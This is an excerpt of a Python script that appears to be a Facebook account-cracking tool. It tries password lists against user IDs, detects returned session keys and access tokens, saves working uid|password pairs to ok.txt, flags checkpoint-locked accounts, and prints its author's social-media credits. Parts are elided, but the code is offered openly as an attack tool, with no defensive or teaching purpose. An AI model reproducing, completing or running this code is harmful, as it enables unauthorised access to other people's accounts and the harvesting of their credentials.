...
class Main:
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[>_] [AXB] : %s/%s -> \033[0;92m [ BY-OK:%s ]- \033[0;91m[BY-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r  \033[0;92m   [AXB-SUCCESSFUL] %s | %s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write("  * --> %s|%s\n"%(uid, pw))
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r  \033[0;91m   [AXB-CHECKPOINT] %s | %s\033[0;97m         "%(uid, pw))
...
if len(sys.argv) == 2:
	if sys.argv[1] == "--info":
		...
		print("\n [*] Author    : AZAN ALI  ")
		print(" [*] Team      :  AXB\n")
		print(" [*] Facebook  : https://facebook.com/ AZAN X.")
		print(" [*] Instagram : https://instagram.com/CROWNBOY")
		print(" [*] YouTube   : NOt INTERNETED ")
		exit(" [*] GitHub    : https://github.com/MR-AZAN ")
	else:
		Main()
